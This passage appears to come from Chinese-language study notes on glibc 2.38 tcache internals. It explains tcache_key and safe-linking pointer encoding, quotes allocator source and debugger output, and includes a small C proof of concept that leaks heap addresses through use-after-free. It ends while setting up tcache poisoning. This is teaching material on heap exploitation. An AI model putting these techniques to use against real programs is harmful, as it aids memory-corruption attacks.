<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc metadata.c -o metadata -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./metadata</span><br><span class="line">previous fake_chunk.key = 0xdeadbeef</span><br><span class="line">now fake_chunk.key = (nil)</span><br><span class="line">chunk2.next = 0xcafebabe</span><br></pre></td></tr></table></figure>
<h3 id="glibc-2.38">glibc-2.38</h3>
<p>数据结构与<code>glibc-2.31</code>相比,在数据结构上并无太大变化,
但是着重加固了<code>key</code>和<code>next</code>字段的计算算法,
目的是为了尽量缓解<code>double free</code></p>
<h4 id="datastructure-2">datastructure</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>key</code>不再是<code>tcache</code>基地址,而是一个随机数</p>
<p><code>next</code>不再是明文的下一个堆块地址,加了密了,盖了帽了</p>
<h4 id="algorithm-2">algorithm</h4>
<h5 id="key-init">key init</h5>
<p>在<code>malloc.c</code>中有一个静态变量<code>tcache_key</code>,
每一个被放到<code>tcahce</code>中的堆块,
都会拷贝之作为自己的<code>key</code></p>
<p>与<code>glibc-2.31</code>上直接使用<code>tcache</code>地址作为<code>key</code>不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br></pre></td></tr></table></figure>
<p>这个值会在第一次调用<code>malloc</code>时, 在整个堆初始化之前,
率先初始化,
包括<code>fopen</code>等操作间接调用的<code>malloc</code></p>
<p>整个初始化过程是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> @ <span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">	ptmalloc_init @ <span class="built_in">malloc</span>/arena.c</span><br><span class="line">		tcache_key_initialize</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__getrandom_nocancel(&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK) != <span class="keyword">sizeof</span>(tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_key = random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">        tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给一个随机数作为<code>tcache_key</code>,
此后本进程执行期间不再更换<code>tcache_key</code>,
所有加入<code>tcache</code>的堆块都要拷贝该<code>key</code>值</p>
<h5 id="malloc-2">malloc</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	=&gt; tcache_get</span><br></pre></td></tr></table></figure>
<p><code>malloc</code>和之前的版本无太大区别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ __libc_malloc</span></span><br><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//桶子下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache != <span class="literal">NULL</span> &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">    victim = tcache_get(tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable(victim);	<span class="comment">//作用不大</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span><span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span><span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e;</span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">        e = *ep;			<span class="comment">//正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span>				</span><br><span class="line">        e = REVEAL_PTR(*ep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(e)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">		<span class="comment">//#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) 要求堆块基地址低三位全为0,注意是低三位位位</span></span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))		</span><br><span class="line">        *ep = REVEAL_PTR(e-&gt;next);			<span class="comment">//异或解码next指针, 正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *ep = PROTECT_PTR(ep, REVEAL_PTR(e-&gt;next));</span><br><span class="line"></span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);		<span class="comment">//更新计数器</span></span><br><span class="line">    e-&gt;key = <span class="number">0</span>;						<span class="comment">//防止泄露key</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个<code>tcache_get_n</code>看上去十分诡异</p>
<p>在<code>tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</code>传参已经很明确了,为啥还要再判断一下呢?</p>
<p>这是因为再另一个函数<code>_mid_memalign</code>中会直接调用<code>tcache_get_n</code>并且这里获取的堆块不一定是桶子头,因此要根据拿走的堆块是头块还是后来块进行区分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_entry **tep = &amp; tcache-&gt;entries[tc_idx];</span><br><span class="line">tcache_entry *te = *tep;</span><br><span class="line"><span class="keyword">while</span> (te != <span class="literal">NULL</span> &amp;&amp; !PTR_IS_ALIGNED (te, alignment))</span><br><span class="line">  &#123;</span><br><span class="line">    tep = &amp; (te-&gt;next);</span><br><span class="line">    te = tcache_next (te);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (te != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *victim = tcache_get_n (tc_idx, tep);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>为什么会有头块和其他块的区别呢?</p>
<p>以为在<code>free</code>时,
<code>tcache-&gt;entries[tc_idx]</code>桶子头指针不会被加密,
但是堆块的next指针会被加密</p>
<p>因此拿头块出来,不需要对
<code>tcache-&gt;entries[tc_idx]</code>指针解密</p>
<p>但是从中间扣一块出来需要解密</p>
</blockquote>
<p>简单来说<code>tcache_get_n</code>干了这三个事</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]</span><br><span class="line">e = *ep</span><br><span class="line"> *ep = REVEAL_PTR(e-&gt;next);</span><br></pre></td></tr></table></figure>
<p><code>ep</code>就是桶子头,</p>
<p><code>e</code>是头上挂着的第一个节点,
由于桶子头到第一个堆块的指针不加密, 因此可以直接解引用拿到头块</p>
<p>接下来要把次块作为新头块链接到桶子头上</p>
<p>但是头块到次块的指针是有加密的,
因此需要先<code>REVEAL_PTR(e-&gt;next);</code>解密
,然后桶子头<code>ep</code>重新指向新头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241010195555838.png"
alt="image-20241010195555838" />
<figcaption aria-hidden="true">image-20241010195555838</figcaption>
</figure>
<p><code>*ep = REVEAL_PTR(e-&gt;next);</code>具体如何解密呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"> *ep 	= REVEAL_PTR(e-&gt;next);</span><br><span class="line">    	= PROTECT_PTR (&amp;e-&gt;next, e-&gt;next)</span><br><span class="line">    	= ( (&amp;e-&gt;next) &gt;&gt;<span class="number">12</span> ) ^ (e-&gt;next)</span><br><span class="line">    	= ( this &gt;&gt; <span class="number">12</span> ) ^ ( next )</span><br></pre></td></tr></table></figure>
<p>就是当前堆块(数据区)地址右移<code>12</code>位然后和<code>next</code>块(数据区)地址做异或</p>
<h5 id="free-2">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	=&gt; _int_free</span><br><span class="line">		=&gt; tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ _int_free</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache_key)) <span class="comment">// 防止double free</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = REVEAL_PTR(tmp-&gt;next), ++cnt) <span class="comment">// next指针不再直接指向下一个堆块, 有异或加密</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// tc_idx对应桶子中还有剩余堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">       detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache_key;		<span class="comment">//给一个key</span></span><br><span class="line"></span><br><span class="line">    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);	<span class="comment">//next加密</span></span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;		<span class="comment">//头插法 ,注意这个指针是没有加密的</span></span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);			<span class="comment">//经验+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>next</code>如何计算的呢?</p>
<p>对于第一个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0</code>,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">8</span> = (tcache_entry *) <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x405</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052a0 &gt;&gt; 12 ) ^ 0</span><br><span class="line">		=0x405</span><br></pre></td></tr></table></figure>
<p>对于第二个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0x4052a0</code>,
是最后一个进入该桶的堆块指针, 这个指针是没有加密的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052c0</span></span><br><span class="line">pwndbg&gt; p  tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">12</span> = (tcache_entry *) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">13</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x4056a5</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052c0 &gt;&gt; 12 ) ^ 0x4052a0</span><br><span class="line">		= 0x405 ^ 0x4052a0</span><br><span class="line">		= 0x4056a5</span><br></pre></td></tr></table></figure>
<h4 id="exploit-1">exploit</h4>
<h5 id="safe-linking-uaf">[safe-linking] UAF</h5>
<p>假设我们有<code>UAF</code>的能力,如果想要泄露一个堆块的地址,还需要什么信息?</p>
<blockquote>
<p>“我们有<code>UAF</code>的能力”,说的更直白一些,就是在堆块释放回到<code>tcache</code>之后,可以打印泄露其<code>next</code>字段的值</p>
</blockquote>
<p>假设<code>tcache</code>为空,chunk1,chunk2,chunk3大小相同</p>
<p><strong>现在<code>free(chunk1)</code>释放回<code>tcache</code></strong></p>
<p><code>free</code> 前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = 0</span><br></pre></td></tr></table></figure>
<p><code>free</code>后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = ( &amp;chunk1.next &gt;&gt; 12 ) ^ 0 =  chunk1_mem &gt;&gt; 12</span><br><span class="line">tcache.entries[idx]	-&gt; chunk1_mem</span><br></pre></td></tr></table></figure>
<p>即使我们有<code>chunk1</code>的<code>UAF</code>,也只能知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = chunk1_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>
<p>右移计算不可逆,低位数据已经丢失</p>
<p>我们能做的只能是利用<code>UAF</code>获取<code>chunk1.next</code>,也就是获取<code>chunk1</code>所在的虚拟页框号</p>
<p><strong>接着<code>free(chunk2)</code></strong></p>
<p><code>free</code>前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = chunk1_mem</span><br></pre></td></tr></table></figure>
<p><code>free</code> 后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (chunk1_mem)</span><br><span class="line">			</span><br><span class="line">tcache.entries[idx] = chunk2_mem		</span><br></pre></td></tr></table></figure>
<p>又<code>chunk1</code>和<code>chunk2</code>距离比较近,在同一页上,因此两者的虚拟页框号相同,也即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem &gt;&gt; 12 == chunk2_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>
<p>那么有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = (chunk1_mem &gt;&gt; 12) ^ (chunk1_mem)</span><br><span class="line">			= (chunk1.next) ^ (chunk1_mem)</span><br></pre></td></tr></table></figure>
<p>又异或运算可逆,因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem = (chunk2.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>
<p><strong>同理,如果继续<code>free(chunk3)</code></strong></p>
<p>可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2_mem = (chunk3.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;  </span><br><span class="line">  <span class="type">size_t</span> * chunk3;</span><br><span class="line">  <span class="type">size_t</span> chunk1_next;</span><br><span class="line">  <span class="type">size_t</span> chunk2_next;</span><br><span class="line">  <span class="type">size_t</span> chunk3_next;</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk1]</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line"></span><br><span class="line">  chunk1_next = chunk1[<span class="number">0</span>];</span><br><span class="line">  chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk2_next = %p\n&quot;</span>,chunk1_next ^ chunk2_next);</span><br><span class="line">  assert(chunk1_next ^ chunk2_next == chunk1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(chunk3);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk3] ====PROTECTED_PTR====&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line">  chunk3_next = chunk3[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk3_next = %p\n&quot;</span>,chunk1_next ^ chunk3_next);</span><br><span class="line">  assert(chunk1_next ^ chunk3_next == chunk2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test<span class="meta"># gcc safe.c -o safe -g -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test# ./safe</span><br><span class="line">chunk1 @ <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk1_next ^ chunk2_next = <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk2 @ <span class="number">0x55fc111882c0</span></span><br><span class="line">chunk1_next ^ chunk3_next = <span class="number">0x55fc111882c0</span></span><br></pre></td></tr></table></figure>
<h5 id="safe-linking-tcache-entry-poisoning">[safe-linking] tcache entry
poisoning</h5>
<p>如果还想象往日一样,往一个被释放进入<code>tcache</code>的堆块上挂不干净的东西<code>fake_chunk</code></p>
<p>首先为了满足<code>tcache.counts[idx]</code>的约束,需要堆里至少有两块,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; chunk1</span><br></pre></td></tr></table></figure>
<p>接下来考虑修改<code>chunk2.next</code>
指向<code>fake_chunk</code></p>
<p>修改完之后<code>tcache</code>的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; fake_chunk</span><br></pre></td></tr></table></figure>
